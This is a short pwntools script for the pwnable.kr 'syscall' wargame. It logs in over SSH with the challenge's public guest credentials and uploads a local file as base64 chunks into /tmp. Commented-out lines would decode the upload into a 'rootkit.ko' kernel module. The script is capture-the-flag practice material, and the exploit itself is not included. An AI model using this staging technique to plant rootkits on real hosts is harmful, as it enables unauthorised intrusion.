#!/usr/bin/python

import os
from pwn import *
import sys
import base64

sh = ssh(
    user = 'syscall',
    password = 'guest',
    host = 'pwnable.kr',
    port = 2222
)

r = sh.shell('/bin/sh')

size  = 0x200
i=0
with open(sys.argv[1], 'rb') as f:
    bc = base64.b64encode(f.read())

print len(bc)

while i < len(bc):
    b = bc[i:i+size]
    command = 'echo -n "%s" >> /tmp/1.txt;'%b
    r.recvuntil('/ $ ')
    r.sendline(command)
    print i
    i +=size

#r.sendline('rm rootkit.ko')
#sleep(0.1)
#r.sendline('base64 -d /tmp/1.txt > rootkit.ko')
#sleep(0.1)
#r.sendline("sed -i rootkit.ko -e \'s/rootkit/rootkis/g\'")
#sleep(0.1)


r.interactive()
